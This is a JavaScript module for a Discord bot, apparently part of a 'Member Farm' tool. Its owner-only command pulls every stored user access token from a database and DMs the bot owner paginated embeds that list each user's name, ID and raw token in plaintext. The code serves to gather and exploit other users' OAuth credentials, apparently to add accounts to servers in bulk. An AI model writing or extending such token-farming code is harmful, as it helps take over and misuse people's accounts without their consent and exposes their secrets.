// language: JavaScript, file: token_cmd.js
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { many } = require('./db');
const config = require('./config');

async function handleTokenList(message, client) {
  if (String(message.author.id) !== String(config.OWNER_ID)) return;

  const tokens = await many(
    'SELECT id, user_id, access_token, expires_at FROM tokens WHERE valid = 1 ORDER BY id'
  );
  if (!tokens.length) {
    await message.author.send('No valid tokens.').catch(() => {});
    await message.reply('No valid tokens.').catch(() => {});
    return;
  }

  const nameCache = new Map();
  for (const tok of tokens) {
    const uid = String(tok.user_id);
    if (nameCache.has(uid)) continue;
    let label = 'unknown';
    try {
      const u = client.users.cache.get(uid) || (await client.users.fetch(uid).catch(() => null));
      if (u) label = u.tag || u.username || uid;
    } catch {}
    nameCache.set(uid, label);
  }

  const pages = [];
  const perPage = 5;
  for (let i = 0; i < tokens.length; i += perPage) {
    const chunk = tokens.slice(i, i + perPage);
    const desc = chunk
      .map((tok) => {
        const name = nameCache.get(String(tok.user_id)) || 'unknown';
        return (
          `**#${tok.id}** — **${name}**\n` +
          `ID: \`${tok.user_id}\`\n` +
          `Token: \`${tok.access_token}\``
        );
      })
      .join('\n\n');
    pages.push(
      new EmbedBuilder()
        .setTitle(`Tokens (${Math.floor(i / perPage) + 1}/${Math.ceil(tokens.length / perPage)})`)
        .setDescription(desc)
        .setColor(0xed4245)
        .setFooter({ text: `Member Farm · ${tokens.length} valid` })
        .setTimestamp()
    );
  }

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('token_prev').setLabel('◀').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('token_next').setLabel('▶').setStyle(ButtonStyle.Secondary)
  );
  const dm = await message.author.send({
    embeds: [pages[0]],
    components: pages.length > 1 ? [row] : [],
  });
  if (pages.length > 1) client.tokenPages.set(dm.id, { pages, index: 0, owner: message.author.id });
  await message.reply('Sent tokens in DM.');
}

module.exports = { handleTokenList };
